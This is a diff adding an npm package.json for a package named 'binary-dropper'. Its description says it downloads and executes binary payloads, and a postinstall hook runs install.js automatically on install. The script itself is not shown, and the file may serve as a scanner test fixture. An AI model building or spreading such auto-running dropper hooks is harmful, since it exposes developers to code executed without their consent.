@@ -1,0 +1,8 @@
+{
+  "name": "binary-dropper",
+  "version": "1.2.0",
+  "description": "Binary payload download and execution",
+  "scripts": {
+    "postinstall": "node install.js"
+  }
+}
